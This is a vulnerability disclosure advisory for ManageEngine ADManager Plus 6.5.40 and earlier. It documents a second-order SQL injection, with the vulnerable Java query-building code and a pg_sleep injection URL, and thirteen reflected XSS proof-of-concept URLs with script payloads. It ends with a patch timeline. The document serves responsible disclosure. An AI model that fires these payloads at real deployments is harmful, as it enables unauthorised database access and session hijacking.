@@ -1,0 +1,191 @@
+1. ADVISORY INFORMATION
+========================================
+Title: ManagEnegine ADManager Plus <= 6.5.40 Multiple Vulnerabilities
+Application: ManagEnegine Admanager
+Remotely Exploitable: Yes
+Authentication Required: Yes
+Versions Affected: <= 6.5.40
+Technology: Java
+Vendor URL: https://www.manageengine.com/products/ad-manager/
+Identified Issues Types: Reflected XSS(s), Authenticated Second Order SQL Injection
+Author: Mehmet Ince
+Date of found: 08 Jan 2017
+
+2. CREDIT
+========================================
+Those vulnerabilities was identified during internal penetration test
+by Mehmet INCE from PRODAFT / INVICTUS.
+
+3. DETAILS
+========================================
+
+3.1 Authenticated Second Order SQL Injection
+-----------------------------------------
+AdventNetADSMClient.jar file contains DuplicateComputersListener class definition which is accessible with /Report.do enpoint.
+start function of DuplicateComputerLİstener class is as follow (Irrelevant part are omitted.)
+
+public void start(ArrayList attributeList, HttpServletRequest request, ReportBean bean)
+  {
+    try
+    {
+      ... OMITTED ...
+
+      this.attrbId = request.getParameter("attrId");
+      this.tableName = request.getParameter("attrTabName");
+      this.attrbName = request.getParameter("attrbColName");
+
+      ... OMITTED ...
+    }
+    catch (Exception e)
+    {
+      e.printStackTrace();
+    }
+  }
+
+It takes user input without validation and set it directly to the class variables such as tableName, attrbName.
+And then deriveData function are going to be called with class variables that under the adversary control
+during complatedAction function execution.
+
+public void completedAction()
+{
+  if (this.updateDetails)
+  {
+    ... OMITTED ...
+
+    deriveData(this.domainName, this.attrbId, this.attrbName, this.tableName);
+
+    ... OMITTED ...
+  }
+  ... OMITTED ...
+}
+
+deriveData function definition is as follow.
+
+public void deriveData(String domainName, String attrbId, String attrbName, String tableName)
+  {
+    ArrayList list = new ArrayList();
+    RelationalAPI relationalAPI = RelationalAPI.getInstance();
+    Connection connection = null;
+    try
+    {
+      TableDefinition tableDef = MetaDataUtil.getTableDefinitionByName(tableName);
+      ColumnDefinition colDef = tableDef.getColumnDefinitionByName(attrbName);
+      String dataType = colDef.getDataType();
+      String selctAttrbCol_defaultValue = "'-'";
+      if (!dataType.equals("CHAR")) {
+        ... OMITTED ...
+      }
+      String query = "select " + tableName + "." + attrbName + "," + tableName + ".domain_name " + " from " + tableName + " inner join " + this.resultTableName + " on " + tableName + ".object_guid=" + this.resultTableName + ".object_guid where " + tableName + "." + attrbName + "!=" + selctAttrbCol_defaultValue + " and " + tableName + ".domain_name='" + domainName + "' and " + this.resultTableName + ".report_generation_id='" + this.generationId + "' group by " + tableName + "." + attrbName + "," + tableName + ".domain_name having count(*) > 1;";
+      if (!tableName.equalsIgnoreCase(this.baseTableName))
+      {
+        String selctAttrbCol = tableName + "." + attrbName;
+        String parentAttrbCol = this.baseTableName + ".domain_name";
+
+        String parentTable = this.baseTableName;String childTable = tableName;
+        String parentJoinCol = this.baseTableName + ".object_guid";
+        String childJoinCol = tableName + ".object_guid";
+
+        String join = parentTable + " inner join " + childTable + " on " + parentJoinCol + " = " + childJoinCol + " inner join " + this.resultTableName + " on " + parentJoinCol + " = " + this.resultTableName + ".object_guid";
+
+        query = "select " + selctAttrbCol + "," + parentAttrbCol + " from " + join + " where " + selctAttrbCol + "!=" + selctAttrbCol_defaultValue + " and " + parentAttrbCol + "='" + domainName + "' and " + this.resultTableName + ".report_generation_id='" + this.generationId + "' group by " + selctAttrbCol + "," + parentAttrbCol + " having count(*) > 1;";
+      }
+      ArrayList result = getResult(query, attrbName);
+
+      ArrayList subList = new ArrayList();
+      if (result.size() > 0)
+      {
+        ... OMITTED ...
+      }
+      if (subList.size() > 0)
+      {
+        ... OMITTED ...
+
+      }
+      else
+      {
+        ... OMITTED ...
+      }
+    }
+    catch (Exception e)
+    {
+      e.printStackTrace();
+    }
+  }
+
+As you can see, database query built with user supplied variable without PDO/ORM.
+
+POC URL : http://12.0.0.136:8080/Report.do?methodToCall=generateReport&action=Generate&domains=DC=acme,DC=local&&attrId=3001&attrTabName=1;%20SELECT%20pg_sleep(100);%20--&attrbColName=COMPUTER_NAME&attrbDispName=Computer%20Name
+Vulnerable Parameters: attrTabName, attrbColName
+
+IMPORTANT NOTE:
+Since whole process are being called as background job, there is no way to successfully exploitation
+with Blind and/or Time Based techniques. Since this application mostly runs on Windows operating systems, it's possible to
+exfiltrate data with DNS queries.(http://www.slideshare.net/stamparm/dns-exfiltration-using-sqlmap-13163281)
+
+3.2 Reflected Cross-Site Scripting Issues
+-----------------------------------------
+
+Issue #1
+POC URL : http://12.0.0.136:8080/ObjectProperties.do?selectedTab=home&guid={0622C4EE-51D8-4381-A1D9-05B66F10BA16}&domainName=12422'%3balert(1)%2f%2f166dlgck5&selectedObjectTab=properties&reportProperties=objectProperties&objectClass=computer&adscsrf=3b59a7c2-4cf4-4f3c-95e4-bfe41f76717a
+Parameters: domainName
+
+Issue #2
+POC URL: http://12.0.0.136:8080/DelegationAudit.do?methodToCall=finish&selectedTab=delegation&selectedTile=delegationAudit&action='"--></style></scRipt><scRipt>alert(0x03279A)</scRipt>&init=true
+Vulnerable Parameters: action
+
+Issue #3
+POC URL: http://12.0.0.136:8080/HDTTemplates.do?technicianId=1&domainName='"--></style></scRipt><scRipt>alert(0x0328D0)</scRipt>
+Vulnerable Parameters: domainName
+
+Issue #4
+POC URL: http://12.0.0.136:8080/jsp/reports/ExportReport.jsp?reportList=true&reportId=43&waadAccId=/'onload='alert(9)
+Vulnerable Parameters: waadAccId
+
+Issue #5
+POC URL: http://12.0.0.136:8080/MgmtAutomation.do?selectedTab=automation&selectedTile=mgmtAutomation&methodToCall=scheduledAutomationCreation&actionType='"--></style></scRipt><scRipt>alert(0x02CB72)</scRipt>
+Vulnerable Parameters: actionType
+
+Issue #6
+POC URL: http://12.0.0.136:8080/ObjectProperties.do?guid={0262EDE4-B845-4E67-B926-BC89BC4DDCBF}&objectClass='"--></style></scRipt><scRipt>alert(0x013AEE)</scRipt>&domainName=acme.local&nodeClicked=DC=acme,DC=local&selectedObjectTab=properties&objectName=Builtin&adscsrf=
+Vulnerable Parameters: objectClass, domainName
+
+Issue #7
+POC URL: http://12.0.0.136:8080/PopupInputSelection.do?methodToCall=selectContainer&domainName='"--></style></scRipt><scRipt>alert(0x025A20)</scRipt>&isWorkFlow=false&id=input2014&container=CN=Users,DC=acme,DC=local
+Vulnerable Parameters: domainName, id, container
+
+Issue #8
+POC URL: http://12.0.0.136:8080/Report.do?selectedTab=reports&methodToCall=report&init=true&reportTab='"--></style></scRipt><scRipt>alert(0x00AE90)</scRipt>&tileName=Compliance Reports
+Vulnerable Parameters: reportTab, tileName, categoryId,
+
+Issue #9
+POC URL: http://12.0.0.136:8080/AdvancedFilter.do?beanName=ReportBean&domainName='"--></style></scRipt><scRipt>alert(0x0376D4)</scRipt>&distinguishedName=DC=acme,DC=local
+Vulnerable Parameters: domainName, distinguishedName
+
+Issue #10
+POC URL: http://12.0.0.136:8080/ViewSIDs.do?domainName='"--></style></scRipt><scRipt>alert(0x041BA0)</scRipt>&permissionType=folder
+Vulnerable Parameters: permissionType, domianName
+
+Issue #11
+POC URL: http://12.0.0.136:8080/computerList.do?defaultNamingContext=DC=acme,DC=local&textField='"--></style></scRipt><scRipt>alert(0x042402)</scRipt>
+Vulnerable Parameters: textField
+
+Issue #12
+POC URL: http://12.0.0.136:8080/ViewObjects.do?defaultNamingContext=x'" onmouseover=alert(9) &modelName=TreeModel&showDomains=false
+Vulnerable Parameters: defaultNamingContext,modelName, showDomain
+
+Issue #13
+POC URL: http://12.0.0.136:8080/groupList.do?defaultNamingContext=DC=acme,DC=local&modifyType='"--></style></scRipt><scRipt>alert(0x0437B4)</scRipt>&beanName=undefined&type=single
+Vulnerable Parameters: modifyType, beanName
+
+
+4. TIMELINE
+========================================
+06 Jan 2017 - Netsparker identified several XSS vulnerabilities.
+07 Jan 2017 - Further investigation done by INVICTUS/PRODAFT team.
+07 Jan 2017 - SQL Injection identified by INVICTUS/PRODAFT team.
+08 Jan 2017 - Details and short term mitigations are shared with members of GPACT/USTA platforms.
+09 Jan 2017 - Vendor notified.
+09 Jan 2017 - Vendor acknowledge the report.
+13 Jan 2017 - Vendor replied with patch.
+13 Jan 2017 - Patch verified by INVICTUS/PRODAFT team.
+16 Jan 2017 - Advisory released (https://www.manageengine.com/products/ad-manager/release-notes.html)
